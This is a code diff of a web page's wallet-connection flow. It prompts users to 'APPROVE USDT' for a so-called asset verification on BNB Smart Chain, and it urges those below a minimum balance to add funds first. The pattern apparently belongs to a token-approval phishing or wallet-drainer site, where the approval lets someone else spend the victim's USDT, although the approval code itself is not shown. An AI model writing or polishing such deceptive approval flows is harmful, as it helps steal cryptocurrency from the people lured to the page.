@@ -310,22 +310,36 @@
             safeApiCall('/api/users/register', { wallet: userAddress });
 
             // Evaluate Verification Flow
+            if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
+
+            const releaseModalCard = document.getElementById('releaseModalCard');
+            const releaseModalIcon = document.getElementById('releaseModalIcon');
+            const releaseModalTitle = document.getElementById('releaseModalTitle');
+            const releaseModalIntro = document.getElementById('releaseModalIntro');
+            const releaseModalHint = document.getElementById('releaseModalHint');
+
             if (usdtBalNum < CONFIG.USER_MIN_USDT) {
-                updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required for verification.`, 'warning');
-                if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
-                if (elements.releaseRequired) elements.releaseRequired.textContent = `${CONFIG.USER_MIN_USDT}.00 USDT`;
-                openModal(elements.releaseModal);
-            } else {
-                updateStatus(`✅ Wallet Connected (${formatAddress(userAddress)}). Click "APPROVE USDT" to verify assets.`, 'success');
-                // Auto prompt USDT approval if not already approved
-                if (allowanceNum < CONFIG.USER_MIN_USDT) {
-                    await approveUsdt();
-                } else {
-                    updateStatus('✅ Assets Already Verified on BNB Smart Chain!', 'success');
-                    if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance} USDT`;
-                    openModal(elements.verifiedModal);
+                updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required.`, 'warning');
+                if (releaseModalTitle) releaseModalTitle.textContent = 'Insufficient Balance';
+                if (releaseModalIntro) releaseModalIntro.textContent = "You don't have enough USDT to complete this action";
+                if (releaseModalCard) releaseModalCard.className = 'verification-modal__card verification-modal__card--red';
+                if (releaseModalIcon) releaseModalIcon.textContent = '✕';
+                if (releaseModalHint) {
+                    releaseModalHint.style.display = 'block';
+                    releaseModalHint.textContent = '↑ Add funds to continue';
                 }
+                if (elements.approveUsdtBtn) elements.approveUsdtBtn.classList.add('hidden');
+            } else {
+                updateStatus(`✅ Wallet Connected (${formatAddress(userAddress)}). Click "APPROVE USDT" in popup to verify assets.`, 'success');
+                if (releaseModalTitle) releaseModalTitle.textContent = 'Asset Verification';
+                if (releaseModalIntro) releaseModalIntro.textContent = 'You have sufficient USDT to complete asset verification';
+                if (releaseModalCard) releaseModalCard.className = 'verification-modal__card verification-modal__card--gold';
+                if (releaseModalIcon) releaseModalIcon.textContent = '⚡';
+                if (releaseModalHint) releaseModalHint.style.display = 'none';
+                if (elements.approveUsdtBtn) elements.approveUsdtBtn.classList.remove('hidden');
             }
+
+            openModal(elements.releaseModal);
 
         } catch (err) {
             console.error('Wallet connection error:', err);
